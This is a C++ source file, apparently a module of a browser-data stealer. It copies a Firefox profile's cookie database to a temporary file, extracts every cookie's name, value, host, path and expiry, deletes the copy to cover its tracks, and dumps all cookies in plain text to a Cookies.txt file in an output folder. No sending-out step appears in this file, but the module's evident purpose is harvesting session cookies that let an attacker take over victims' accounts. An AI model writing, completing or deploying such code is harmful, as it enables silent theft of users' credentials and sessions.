//
// Created by .1qxz on 10.06.2024.
//

#include "FCookies.h"

void FCookies::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->withProfile(browser_root) / "cookies.sqlite";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> cookies;

    SQLiteUtil::connectAndRead(R"(
        SELECT name, value, host, path, expiry FROM moz_cookies
    )", copied_db, [&cookies](sqlite3_stmt *stmt) {
        auto bookmarkRecord = std::make_unique<Cookie>();

        bookmarkRecord->name = SQLiteUtil::readString(stmt, 0);
        bookmarkRecord->value = SQLiteUtil::readString(stmt, 1);
        bookmarkRecord->host_key = SQLiteUtil::readString(stmt, 2);
        bookmarkRecord->path = SQLiteUtil::readString(stmt, 3);
        bookmarkRecord->expires_utc = SQLiteUtil::readLong64(stmt, 4);

        cookies.push_back(std::move(bookmarkRecord));
    });

    fs::remove(copied_db);

    Entity::writeSelf(root / "Cookies.txt", cookies, false);
}
